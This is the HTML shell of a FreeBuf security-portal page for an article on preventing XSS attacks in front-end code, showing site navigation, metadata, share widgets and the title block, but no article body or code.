<!--
                              _.._        ,------------.
                           ,'      `.    ( We want you! )
                          /  __) __` \    `-,----------'
                         (  (`-`(-')  ) _.-'
                         /)  \  = /  (
                        /'    |--' .  \
                       (  ,---|  `-.)__`
                        )(  `-.,--'   _`-.
                       '/,'          (  Uu",
                        (_       ,    `/,-' )
                        `.__,  : `-'/  /`--'
                          |     `--'  |
                          `   `-._   /
                           \        (
                           /\ .      \.  freebuf
                          / |` \     ,-\
                         /  \| .)   /   \
                        ( ,'|\    ,'     :
                        | \,`.`--"/      }
                        `,'    \  |,'    /
                       / "-._   `-/      |
                       "-.   "-.,'|     ;
                      /        _/["---'""]
                     :        /  |"-     '
                     '           |      /
                                 `      |
-->
<!doctype html>
<html data-n-head-ssr>

<head>
  <title>前端安全系列（一）：如何防止XSS攻击？ - FreeBuf网络安全行业门户</title><meta data-n-head="ssr" charset="utf-8"><meta data-n-head="ssr" name="viewport" content="width=device-width,initial-scale=1"><meta data-n-head="ssr" name="renderer" content="webkit"><meta data-n-head="ssr" http-equiv="X-UA-Compatible" content="IE=edge"><meta data-n-head="ssr" name="baidu-site-verification" content="nKKKqQxp6R"><meta data-n-head="ssr" charset="utf-8"><meta data-n-head="ssr" name="viewport" content="width=device-width,inital-scal=1"><meta data-n-head="ssr" data-hid="description" name="description" content="在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。"><meta data-n-head="ssr" name="keywords" content="web,xss,前端安全"><link data-n-head="ssr" rel="icon" type="image/x-icon" href="https://www.freebuf.com/favicon.ico"><link data-n-head="ssr" rel="stylesheet" href="https://www.freebuf.com/style/editor.css"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.f2bddb9b2047fee49046.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.32658a830f395d50ed89.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.a53ea8b00779fcef0fe8.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.8c990f909effb6d618d3.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.e258e4cfb199b83189c6.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.19981de942074100ce9c.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.927944ae29787a1b414f.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.02cf93cfce14e2557064.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.d38dc245ca9b7dd8571d.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.e21c04f32fbd7819bb01.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.2ce4e8f001d4b2b67fbb.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.4a67fc481049623895c6.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.627b1661cc29c3e32429.js" as="script"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.7b5eb7ff4936b9e0c27a.css" as="style"><link rel="preload" href="https://www.freebuf.com/freebuf/2.1.0.9b4235960ae0c2cc9600.js" as="script"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.8c990f909effb6d618d3.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.19981de942074100ce9c.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.e21c04f32fbd7819bb01.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.4a67fc481049623895c6.css"><link rel="stylesheet" href="https://www.freebuf.com/freebuf/2.1.0.7b5eb7ff4936b9e0c27a.css">
</head>

<body>
  <div data-server-rendered="true" id="__nuxt"><!----><div id="__layout"><div id="components-layout-demo-basic" class="public-header-article" data-v-55d8de90><section class="ant-layout" data-v-55d8de90><header class="articles-layout-header ant-layout-header" style="position:fixed;z-index:51;width:100%" data-v-55d8de90><div class="content-header" data-v-55d8de90><a href="https://www.freebuf.com/" class="logo-view nuxt-link-active" data-v-c5f1b53a data-v-55d8de90><img src="https://www.freebuf.com/images/logoMax.png" alt="freeBuf" style="color:#fff" data-v-c5f1b53a></a> <div class="main-view" data-v-6072cd9c data-v-55d8de90><div class="main-but" data-v-6072cd9c><span style="font-size:14px;display:inline-block;white-space:nowrap;letter-spacing:1px" data-v-6072cd9c>主站</span> <svg aria-hidden="true" class="svg-icon main-slider-cion" style="margin-left:3px" data-v-322983b7 data-v-6072cd9c><use xlink:href="#caret-down" data-v-322983b7></use></svg> <div class="main-but-view" data-v-6072cd9c><div data-v-6072cd9c><div class="tag-top" data-v-6072cd9c><p data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#heike" data-v-322983b7></use></svg><span data-v-6072cd9c>分类</span></p> <div class="tag-top-bottom" data-v-6072cd9c><span class="border-none" data-v-6072cd9c>
              漏洞
            </span> <span data-v-6072cd9c>
              工具
            </span> <span data-v-6072cd9c>
              极客
            </span> <span class="nuxt-link-active" data-v-6072cd9c>
              Web安全
            </span> <span data-v-6072cd9c>
              系统安全
            </span> <span data-v-6072cd9c>
              网络安全
            </span> <span data-v-6072cd9c>
              无线安全
            </span> <span class="border-none" data-v-6072cd9c>
              设备/客户端安全
            </span> <span data-v-6072cd9c>
              数据安全
            </span> <span data-v-6072cd9c>
              安全管理
            </span> <span data-v-6072cd9c>
              企业安全
            </span> <span data-v-6072cd9c>
              工控安全
            </span></div></div> <div class="tag-top" style="margin-top:10px" data-v-6072cd9c><p data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#eye-fill" data-v-322983b7></use></svg><span data-v-6072cd9c>特色</span></p> <div class="tag-top-bottom" data-v-6072cd9c><span class="border-none" data-v-6072cd9c>
              头条
            </span> <span data-v-6072cd9c>
              人物志
            </span> <span data-v-6072cd9c>
              活动
            </span> <span data-v-6072cd9c>
              视频
            </span> <span data-v-6072cd9c>
              观点
            </span> <span data-v-6072cd9c>
              招聘
            </span> <span data-v-6072cd9c>
              报告
            </span> <span data-v-6072cd9c>
              资讯
            </span> <span class="border-none" data-v-6072cd9c>
              区块链安全
            </span> <span data-v-6072cd9c>
              标准与合规
            </span> <span data-v-6072cd9c>
              容器安全
            </span> <span data-v-6072cd9c>
              公开课
            </span></div></div></div> <div class="tag-bottom" data-v-6072cd9c><a href="https://www.freebuf.com/report" target="_blank" class="left-slider-but" data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#file-text-fill" data-v-322983b7></use></svg><span data-v-6072cd9c>报告</span></a> <div role="separator" class="ant-divider ant-divider-vertical" style="margin:0 30px;background:#3a3a3a" data-v-6072cd9c></div> <a href="https://www.freebuf.com/column" data-v-6072cd9c><svg aria-hidden="true" class="svg-icon tag-svg" data-v-322983b7 data-v-6072cd9c><use xlink:href="#folder-open-fill" data-v-322983b7></use></svg><span data-v-6072cd9c>专辑</span></a></div></div></div></div> <div class="menu-view" data-v-377c74a3 data-v-55d8de90><ul role="menu" class="ant-menu ant-menu-horizontal ant-menu-root ant-menu-dark" data-v-377c74a3><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item" data-v-377c74a3><a href="https://live.freebuf.com" target="_blank" data-v-377c74a3>公开课</a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item" data-v-377c74a3><a href="https://shop.freebuf.com" target="_blank" data-v-377c74a3>商城</a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="menu-item-self ant-menu-submenu ant-menu-submenu-horizontal" data-v-377c74a3><div aria-haspopup="true" class="ant-menu-submenu-title"><span class="submenu-title-wrapper" data-v-377c74a3>
						用户服务
						<svg aria-hidden="true" class="svg-icon home-menu" data-v-322983b7 data-v-377c74a3><use xlink:href="#caret-down" data-v-322983b7></use></svg></span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="visibility:hidden;position:absolute"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li></ul> <div class="feature-column-container" data-v-05e06156 data-v-377c74a3><span class="feature-column-item" data-v-05e06156>行业服务
    <svg aria-hidden="true" class="svg-icon home-menu" data-v-322983b7 data-v-05e06156><use xlink:href="#caret-down" data-v-322983b7></use></svg></span> <div class="feature-column-menu" data-v-05e06156><div class="feature-column" data-v-05e06156><span data-v-05e06156><svg aria-hidden="true" class="svg-icon zhengfu" data-v-322983b7 data-v-05e06156><use xlink:href="#zhengfu" data-v-322983b7></use></svg>
        政 府
      </span> <div data-v-05e06156><span data-v-05e06156>
          CNCERT
          <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
          CNNVD
          <!----></span></div></div> <div class="company-rewrite" data-v-05e06156><span data-v-05e06156>
        会员体系（甲方）
        <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
        会员体系（厂商）
        <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
        产品名录
        <span class="line" data-v-05e06156></span></span><span data-v-05e06156>
        企业空间
        <!----></span></div></div></div> <span class="wikibtn" data-v-377c74a3><a href="https://wiki.freebuf.com/page" target="_blank" data-v-377c74a3>知识大陆</a></span></div> <div class="user-view" data-v-55d8de90><div class="search-cloud"><i aria-label="icon: search" class="anticon anticon-search" style="color:rgba(255,255,255,.6)"><svg viewBox="64 64 896 896" focusable="false" data-icon="search" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1-56.6-56.7-132-87.9-212.1-87.9s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6a8.2 8.2 0 0 0 11.6 0l43.6-43.5a8.2 8.2 0 0 0 0-11.6zM570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4z"></path></svg></i> <span class="ant-input-search ant-input-search-enter-button ant-input-group-wrapper"><span class="ant-input-wrapper ant-input-group"><input placeholder="搜索关键词..." class="ant-input"><span class="ant-input-group-addon"><button type="button" class="ant-btn ant-input-search-button"><span>搜索</span></button></span></span></span></div> <div class="guide-write-wrap"><button type="button" class="write-btn ant-btn ant-btn-primary ant-dropdown-trigger"><span>创作中心</span></button> <!----></div> <div class="tool-but-view album-square ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#album-square-hover" data-v-322983b7></use></svg></div> <div class="tool-but-view album-square ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#load-app" data-v-322983b7></use></svg></div> <div class="tool-but-view ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#calendar" data-v-322983b7></use></svg></div> <div class="tool-but-view ant-dropdown-trigger"><svg aria-hidden="true" class="svg-icon" data-v-322983b7><use xlink:href="#tool" data-v-322983b7></use></svg></div> <button type="button" class="login-register ant-btn ant-btn-primary"><a href="https://www.freebuf.com/oauth" class="login-but login-btn">登录</a><a href="https://account.tophant.com/register" class="login-but">注册</a></button></div></div></header> <main class="content-body ant-layout-content" style="padding:20px 0;margin-top:55px" data-v-55d8de90><div id="artical-detail-page" data-v-81187e68 data-v-55d8de90 data-v-55d8de90><div class="floating-view" data-v-a4133620 data-v-81187e68><!----> <div class="floating-view-item qianbao" data-v-a4133620></div> <div class="floating-view-item" data-v-a4133620><svg aria-hidden="true" class="svg-icon floating-icon" data-v-322983b7 data-v-a4133620><use xlink:href="#edit1" data-v-322983b7></use></svg></div> <div class="floating-view-item qrcode-box" data-v-a4133620><svg aria-hidden="true" class="svg-icon floating-icon" data-v-322983b7 data-v-a4133620><use xlink:href="#qrcode" data-v-322983b7></use></svg> <div class="qrcode-list" data-v-a4133620><div class="tab-view" data-v-a4133620><p data-v-a4133620><span class="active" data-v-a4133620>官方公众号</span><span data-v-a4133620>企业安全</span><span data-v-a4133620>新浪微博</span></p> <div class="qrcode-view" data-v-a4133620><img src="https://www.freebuf.com/images/gzh_code.jpg" alt data-v-a4133620> <p data-v-a4133620>FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。</p></div></div> <div class="sanjiao-view" data-v-a4133620></div></div></div> <div class="floating-view-item qrcode-xcx" data-v-a4133620><svg aria-hidden="true" class="svg-icon floating-icon" data-v-322983b7 data-v-a4133620><use xlink:href="#erweima" data-v-322983b7></use></svg> <div class="qrcode-list" data-v-a4133620><div class="tab-view" data-v-a4133620><div class="qrcode-view xcx-box" data-v-a4133620><img src="https://www.freebuf.com/images/xcx-code.jpg" alt="FreeBuf+小程序" style="color:#fff" data-v-a4133620> <p class="xcx-wiew" data-v-a4133620><span data-v-a4133620>FreeBuf+小程序</span><label data-v-a4133620>把安全装进口袋</label></p></div></div> <div class="sanjiao-view" data-v-a4133620></div></div></div> <div class="floating-view-item qrcode-xcx" data-v-a4133620><a href="https://wiki.freebuf.com/page" target="_blank" data-v-a4133620><svg aria-hidden="true" class="svg-icon" style="font-size:17px" data-v-322983b7 data-v-a4133620><use xlink:href="#wiki_tip" data-v-322983b7></use></svg></a></div> <div style="width:40px;height:40px" data-v-a4133620><!----></div> <!----> <!----> <!----></div> <div class="page-header" data-v-81187e68><div class="header-container" data-v-81187e68><div class="page-head-wrapper" data-v-81187e68><div class="title" data-v-81187e68>前端安全系列（一）：如何防止XSS攻击？</div> <ul class="wrpper" data-v-81187e68><li class="auth" data-v-81187e68><a href="" data-v-81187e68><span class="img" data-v-81187e68><img src="" data-v-81187e68></span> <span class="name" data-v-81187e68></span></a></li> <li class="collet" data-v-81187e68><span class="focus" data-v-81187e68>
								关注
							</span></li> <!----></ul></div></div></div> <div class="container" data-v-81187e68><div class="aside-left" data-v-81187e68><div class="aside-left-wrapper" data-v-81187e68><ul class="tabs-panel" data-v-81187e68><li class="tab active" data-v-81187e68><a href="https://www.freebuf.com/articles/web" target="_blank" data-v-81187e68>Web安全</a></li></ul> <div class="approve-panel" data-v-81187e68><div class="approve" data-v-81187e68><div data-v-81187e68><span class="ant-badge" data-v-81187e68><i aria-label="图标: like" class="anticon anticon-like" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="like" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M885.9 533.7c16.8-22.2 26.1-49.4 26.1-77.7 0-44.9-25.1-87.4-65.5-111.1a67.67 67.67 0 0 0-34.3-9.3H572.4l6-122.9c1.4-29.7-9.1-57.9-29.5-79.4A106.62 106.62 0 0 0 471 99.9c-52 0-98 35-111.8 85.1l-85.9 311H144c-17.7 0-32 14.3-32 32v364c0 17.7 14.3 32 32 32h601.3c9.2 0 18.2-1.8 26.5-5.4 47.6-20.3 78.3-66.8 78.3-118.4 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7 0-12.6-1.8-25-5.4-37 16.8-22.2 26.1-49.4 26.1-77.7-.2-12.6-2-25.1-5.6-37.1zM184 852V568h81v284h-81zm636.4-353l-21.9 19 13.9 25.4a56.2 56.2 0 0 1 6.9 27.3c0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4a56.2 56.2 0 0 1 6.9 27.3c0 16.5-7.2 32.2-19.6 43l-21.9 19 13.9 25.4a56.2 56.2 0 0 1 6.9 27.3c0 22.4-13.2 42.6-33.6 51.8H329V564.8l99.5-360.5a44.1 44.1 0 0 1 42.2-32.3c7.6 0 15.1 2.2 21.1 6.7 9.9 7.4 15.2 18.6 14.6 30.5l-9.6 198.4h314.4C829 418.5 840 436.9 840 456c0 16.5-7.2 32.1-19.6 43z"></path></svg></i><!----></span></div></div> <div class="approve" data-v-81187e68><div data-v-81187e68><span class="ant-badge" data-v-81187e68><i aria-label="图标: message" class="anticon anticon-message" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="message" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M464 512a48 48 0 1 0 96 0 48 48 0 1 0-96 0zm200 0a48 48 0 1 0 96 0 48 48 0 1 0-96 0zm-400 0a48 48 0 1 0 96 0 48 48 0 1 0-96 0zm661.2-173.6c-22.6-53.7-55-101.9-96.3-143.3a444.35 444.35 0 0 0-143.3-96.3C630.6 75.7 572.2 64 512 64h-2c-60.6.3-119.3 12.3-174.5 35.9a445.35 445.35 0 0 0-142 96.5c-40.9 41.3-73 89.3-95.2 142.8-23 55.4-34.6 114.3-34.3 174.9A449.4 449.4 0 0 0 112 714v152a46 46 0 0 0 46 46h152.1A449.4 449.4 0 0 0 510 960h2.1c59.9 0 118-11.6 172.7-34.3a444.48 444.48 0 0 0 142.8-95.2c41.3-40.9 73.8-88.7 96.5-142 23.6-55.2 35.6-113.9 35.9-174.5.3-60.9-11.5-120-34.8-175.6zm-151.1 438C704 845.8 611 884 512 884h-1.7c-60.3-.3-120.2-15.3-173.1-43.5l-8.4-4.5H188V695.2l-4.5-8.4C155.3 633.9 140.3 574 140 513.7c-.4-99.7 37.7-193.3 107.6-263.8 69.8-70.5 163.1-109.5 262.8-109.9h1.7c50 0 98.5 9.7 144.2 28.9 44.6 18.7 84.6 45.6 119 80 34.3 34.3 61.3 74.4 80 119 19.4 46.2 29.1 95.2 28.9 145.8-.6 99.6-39.7 192.9-110.1 262.7z"></path></svg></i><!----></span></div></div> <div class="approve" data-v-81187e68><div data-v-81187e68 data-v-81187e68><i aria-label="图标: star" class="anticon anticon-star" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="star" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M908.1 353.1l-253.9-36.9L540.7 86.1c-3.1-6.3-8.2-11.4-14.5-14.5-15.8-7.8-35-1.3-42.9 14.5L369.8 316.2l-253.9 36.9c-7 1-13.4 4.3-18.3 9.3a32.05 32.05 0 0 0 .6 45.3l183.7 179.1-43.4 252.9a31.95 31.95 0 0 0 46.4 33.7L512 754l227.1 119.4c6.2 3.3 13.4 4.4 20.3 3.2 17.4-3 29.1-19.5 26.1-36.9l-43.4-252.9 183.7-179.1c5-4.9 8.3-11.3 9.3-18.3 2.7-17.5-9.5-33.7-27-36.3zM664.8 561.6l36.1 210.3L512 672.7 323.1 772l36.1-210.3-152.8-149L417.6 382 512 190.7 606.4 382l211.2 30.7-152.8 148.9z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div data-v-81187e68 data-v-81187e68><svg aria-hidden="true" class="svg-icon" style="font-size:20px" data-v-322983b7 data-v-81187e68><use xlink:href="#collect" data-v-322983b7></use></svg></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: share-alt" class="anticon anticon-share-alt" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="share-alt" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M752 664c-28.5 0-54.8 10-75.4 26.7L469.4 540.8a160.68 160.68 0 0 0 0-57.6l207.2-149.9C697.2 350 723.5 360 752 360c66.2 0 120-53.8 120-120s-53.8-120-120-120-120 53.8-120 120c0 11.6 1.6 22.7 4.7 33.3L439.9 415.8C410.7 377.1 364.3 352 312 352c-88.4 0-160 71.6-160 160s71.6 160 160 160c52.3 0 98.7-25.1 127.9-63.8l196.8 142.5c-3.1 10.6-4.7 21.8-4.7 33.3 0 66.2 53.8 120 120 120s120-53.8 120-120-53.8-120-120-120zm0-476c28.7 0 52 23.3 52 52s-23.3 52-52 52-52-23.3-52-52 23.3-52 52-52zM312 600c-48.5 0-88-39.5-88-88s39.5-88 88-88 88 39.5 88 88-39.5 88-88 88zm440 236c-28.7 0-52-23.3-52-52s23.3-52 52-52 52 23.3 52 52-23.3 52-52 52z"></path></svg></i></div></div> <div style="display:none" data-v-81187e68><div class="approve" data-v-81187e68 data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: wechat" class="anticon anticon-wechat" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="wechat" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M690.1 377.4c5.9 0 11.8.2 17.6.5-24.4-128.7-158.3-227.1-319.9-227.1C209 150.8 64 271.4 64 420.2c0 81.1 43.6 154.2 111.9 203.6a21.5 21.5 0 0 1 9.1 17.6c0 2.4-.5 4.6-1.1 6.9-5.5 20.3-14.2 52.8-14.6 54.3-.7 2.6-1.7 5.2-1.7 7.9 0 5.9 4.8 10.8 10.8 10.8 2.3 0 4.2-.9 6.2-2l70.9-40.9c5.3-3.1 11-5 17.2-5 3.2 0 6.4.5 9.5 1.4 33.1 9.5 68.8 14.8 105.7 14.8 6 0 11.9-.1 17.8-.4-7.1-21-10.9-43.1-10.9-66 0-135.8 132.2-245.8 295.3-245.8zm-194.3-86.5c23.8 0 43.2 19.3 43.2 43.1s-19.3 43.1-43.2 43.1c-23.8 0-43.2-19.3-43.2-43.1s19.4-43.1 43.2-43.1zm-215.9 86.2c-23.8 0-43.2-19.3-43.2-43.1s19.3-43.1 43.2-43.1 43.2 19.3 43.2 43.1-19.4 43.1-43.2 43.1zm586.8 415.6c56.9-41.2 93.2-102 93.2-169.7 0-124-120.8-224.5-269.9-224.5-149 0-269.9 100.5-269.9 224.5S540.9 847.5 690 847.5c30.8 0 60.6-4.4 88.1-12.3 2.6-.8 5.2-1.2 7.9-1.2 5.2 0 9.9 1.6 14.3 4.1l59.1 34c1.7 1 3.3 1.7 5.2 1.7a9 9 0 0 0 6.4-2.6 9 9 0 0 0 2.6-6.4c0-2.2-.9-4.4-1.4-6.6-.3-1.2-7.6-28.3-12.2-45.3-.5-1.9-.9-3.8-.9-5.7.1-5.9 3.1-11.2 7.6-14.5zM600.2 587.2c-19.9 0-36-16.1-36-35.9 0-19.8 16.1-35.9 36-35.9s36 16.1 36 35.9c0 19.8-16.2 35.9-36 35.9zm179.9 0c-19.9 0-36-16.1-36-35.9 0-19.8 16.1-35.9 36-35.9s36 16.1 36 35.9a36.08 36.08 0 0 1-36 35.9z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: weibo-circle" class="anticon anticon-weibo-circle" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="weibo-circle" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm-44.4 672C353.1 736 236 680.4 236 588.9c0-47.8 30.2-103.1 82.3-155.3 69.5-69.6 150.6-101.4 181.1-70.8 13.5 13.5 14.8 36.8 6.1 64.6-4.5 14 13.1 6.3 13.1 6.3 56.2-23.6 105.2-25 123.1.7 9.6 13.7 8.6 32.8-.2 55.1-4.1 10.2 1.3 11.8 9 14.1 31.7 9.8 66.9 33.6 66.9 75.5.2 69.5-99.7 156.9-249.8 156.9zm207.3-290.8a34.9 34.9 0 0 0-7.2-34.1 34.68 34.68 0 0 0-33.1-10.7 18.24 18.24 0 0 1-7.6-35.7c24.1-5.1 50.1 2.3 67.7 21.9 17.7 19.6 22.4 46.3 14.9 69.8a18.13 18.13 0 0 1-22.9 11.7 18.18 18.18 0 0 1-11.8-22.9zm106 34.3s0 .1 0 0a21.1 21.1 0 0 1-26.6 13.7 21.19 21.19 0 0 1-13.6-26.7c11-34.2 4-73.2-21.7-101.8a104.04 104.04 0 0 0-98.9-32.1 21.14 21.14 0 0 1-25.1-16.3 21.07 21.07 0 0 1 16.2-25.1c49.4-10.5 102.8 4.8 139.1 45.1 36.3 40.2 46.1 95.1 30.6 143.2zm-334.5 6.1c-91.4 9-160.7 65.1-154.7 125.2 5.9 60.1 84.8 101.5 176.2 92.5 91.4-9.1 160.7-65.1 154.7-125.3-5.9-60.1-84.8-101.5-176.2-92.4zm80.2 141.7c-18.7 42.3-72.3 64.8-117.8 50.1-43.9-14.2-62.5-57.7-43.3-96.8 18.9-38.4 68-60.1 111.5-48.8 45 11.7 68 54.2 49.6 95.5zm-93-32.2c-14.2-5.9-32.4.2-41.2 13.9-8.8 13.8-4.7 30.2 9.3 36.6 14.3 6.5 33.2.3 42-13.8 8.8-14.3 4.2-30.6-10.1-36.7zm34.9-14.5c-5.4-2.2-12.2.5-15.4 5.8-3.1 5.4-1.4 11.5 4.1 13.8 5.5 2.3 12.6-.3 15.8-5.8 3-5.6 1-11.8-4.5-13.8z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: qq" class="anticon anticon-qq" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="qq" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M824.8 613.2c-16-51.4-34.4-94.6-62.7-165.3C766.5 262.2 689.3 112 511.5 112 331.7 112 256.2 265.2 261 447.9c-28.4 70.8-46.7 113.7-62.7 165.3-34 109.5-23 154.8-14.6 155.8 18 2.2 70.1-82.4 70.1-82.4 0 49 25.2 112.9 79.8 159-26.4 8.1-85.7 29.9-71.6 53.8 11.4 19.3 196.2 12.3 249.5 6.3 53.3 6 238.1 13 249.5-6.3 14.1-23.8-45.3-45.7-71.6-53.8 54.6-46.2 79.8-110.1 79.8-159 0 0 52.1 84.6 70.1 82.4 8.5-1.1 19.5-46.4-14.5-155.8z"></path></svg></i></div></div> <div class="approve" data-v-81187e68><div class="share-draw" data-v-81187e68><i aria-label="图标: link" class="anticon anticon-link" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="link" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M574 665.4a8.03 8.03 0 0 0-11.3 0L446.5 781.6c-53.8 53.8-144.6 59.5-204 0-59.5-59.5-53.8-150.2 0-204l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3l-39.8-39.8a8.03 8.03 0 0 0-11.3 0L191.4 526.5c-84.6 84.6-84.6 221.5 0 306s221.5 84.6 306 0l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3L574 665.4zm258.6-474c-84.6-84.6-221.5-84.6-306 0L410.3 307.6a8.03 8.03 0 0 0 0 11.3l39.7 39.7c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c53.8-53.8 144.6-59.5 204 0 59.5 59.5 53.8 150.2 0 204L665.3 562.6a8.03 8.03 0 0 0 0 11.3l39.8 39.8c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c84.5-84.6 84.5-221.5 0-306.1zM610.1 372.3a8.03 8.03 0 0 0-11.3 0L372.3 598.7a8.03 8.03 0 0 0 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l226.4-226.4c3.1-3.1 3.1-8.2 0-11.3l-39.5-39.6z"></path></svg></i></div></div></div></div></div></div> <div class="main" data-v-81187e68><div class="main-warpper" data-v-81187e68><div class="artical-header" data-v-81187e68><div class="title" data-v-81187e68><span class="title-span" data-v-81187e68>前端安全系列（一）：如何防止XSS攻击？</span> <!----> <!----> <!----> <!----></div> <div class="author-info" data-v-81187e68><a href="" class="author" data-v-81187e68><i aria-label="图标: user" class="anticon anticon-user" data-v-81187e68><svg viewBox="64 64 896 896" focusable="false" data-icon="user" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M858.5 763.6a374 374 0 0 0-80.6-119.5 375.63 375.63 0 0 0-119.5-80.6c-.4-.2-.8-.3-1.2-.5C719.5 518 760 444.7 760 362c0-137-111-248-248-248S264 225 264 362c0 82.7 40.5 156 102.8 201.1-.4.2-.8.3-1.2.5-44.8 18.9-85 46-119.5 80.6a375.63 375.63 0 0 0-80.6 119.5A371.7 371.7 0 0 0 136 901.8a8 8 0 0 0 8 8.2h60c4.4 0 7.9-3.5 8-7.8 2-77.2 33-149.5 87.8-204.3 56.7-56.7 132-87.9 212.2-87.9s155.5 31.2 212.2 87.9C779 752.7 810 825 812 902.2c.1 4.4 3.6 7.8 8 7.8h60a8 8 0 0 0 8-8.2c-1-47.8-10.9-94.3-29.5-138.2zM512 534c-45.9 0-89.1-17.9-121.6-50.4S340 407.9 340 362c0-45.9 17.9-89.1 50.4-121.6S466.1 190 512 190s89.1 17.9 121.6 50.4S684 316.1 684 362c0 45.9-17.9 89.1-50.4 121.6S557.9 534 512 534z"></path></svg></i>
